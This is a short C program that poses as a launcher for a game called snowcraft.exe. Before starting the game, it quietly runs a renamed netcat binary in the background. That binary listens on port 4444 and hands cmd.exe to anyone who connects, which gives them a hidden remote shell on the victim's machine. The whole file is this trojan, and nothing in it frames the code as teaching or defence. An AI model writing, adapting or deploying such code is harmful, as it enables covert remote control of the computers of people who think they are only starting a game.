#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
	// loading the ncat.exe file -> called chest.txt
	system("start /B dir\\chest.exe -d 100ms -l -p 4444 -e cmd.exe"); // -d deamon -L listen -p port -e program to execute
	// running the game after
	system("dir\\snowcraft.exe");
	return 0;
}
